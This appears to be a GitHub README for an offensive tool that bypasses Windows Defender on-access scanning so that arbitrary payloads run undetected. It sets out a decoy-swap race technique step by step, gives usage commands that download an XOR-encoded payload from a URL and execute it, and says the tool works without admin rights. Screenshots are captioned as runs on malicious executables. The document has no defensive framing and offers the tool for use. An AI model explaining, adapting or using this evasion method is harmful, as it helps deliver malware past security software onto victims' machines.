# DefenderWipe

Executes a payload bypassing Windows Defender on-access scanning.

## How it works

1. Downloads or reads payload into memory
2. Drops a clean Microsoft binary as a decoy to temp
3. Scans the decoy through MpClient — Defender clears the path
4. Opens a trusted file handle on the cleared path
5. Overwrites the decoy with payload bytes through the trusted handle
6. Re-scans the path — Defender clears it again post-write
7. Executes from the cleared path before async rescan completes

## Usage

CloudBypass.exe <payload.exe>
CloudBypass.exe https://url/payload.dat


## Notes

- URL payloads must be XOR encoded with key 0xAB using extractor.bat
- Payload never touches disk as a named executable
- Works from standard user, no admin required
- Re-run if execution fails — timing dependent

## Files

- CloudBypass.exe — main bypass tool
- extractor.bat — drag and drop XOR encoder for URL delivery
- Normal Run on test:
<img width="610" height="208" alt="NormalRun" src="https://github.com/user-attachments/assets/f1a8a9a5-7b62-4318-8c4a-12a8b76e23f2" />
Run on malicious exe:
<img width="965" height="449" alt="Runwithbypassnourl" src="https://github.com/user-attachments/assets/08f4631b-aca6-4246-9627-e7aef65e1fa8" />
Run on malicious exe through url:
<img width="965" height="449" alt="Runwithbypassnourl" src="https://github.com/user-attachments/assets/2b7e052e-0e64-417d-8faa-d0931a0e0b07" />
